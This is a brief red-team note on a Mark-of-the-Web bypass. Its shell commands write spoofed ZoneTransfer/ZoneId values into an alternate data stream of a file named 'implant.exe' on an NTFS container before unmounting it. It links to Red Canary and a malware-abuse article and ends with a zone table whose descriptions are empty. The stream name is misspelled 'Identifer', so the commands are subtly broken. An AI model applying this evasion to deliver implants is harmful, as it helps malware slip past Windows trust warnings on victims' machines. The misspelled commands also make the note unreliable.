# 04 - Spoof ZoneTransfer (MOTW Bypass)

Search Tag(s): #initial-foothold #defense-evasion #windows #use-cases

```
$ echo -e "[ZoneTransfer]\nZoneId=0" > /mnt/ntfs/implant.exe:Zone.Identifer

$ echo -e "[ZoneTransfer]\nZoneId=1" > /mnt/ntfs/implant.exe:Zone.Identifer

$ echo -e "[ZoneTransfer]\nZoneId=2" > /mnt/ntfs/implant.exe:Zone.Identifer
```

Unmount the container.

```
$ sudo umount /mnt/ntfs/
```

---
## References

- [[Tactics && Techniques && Procedures (TTPs) Phases/F - Post Exploitation/Shell Is The Beginning/02 - Defense Evasion/10 - Hide Artifacts/Alternate Data Streams (ADS)/Living off the Land|Windows: Hide Artifacts]]

- [Red Canary: Mark-of-the-Web Bypass](https://redcanary.com/threat-detection-report/techniques/mark-of-the-web-bypass/)

- [SecurityLiterate.com: How Malware Abuses the Zone Identifier to Circumvent Detection and Analysis](https://securityliterate.com/how-malware-abuses-the-zone-identifier-to-circumvent-detection-and-analysis/)

### Table Reference

| Zone Identifier | Description |
| :-------------: | ----------- |
|        0        |             |
|        1        |             |
|        2        |             |
|        3        |             |
|        4        |             |
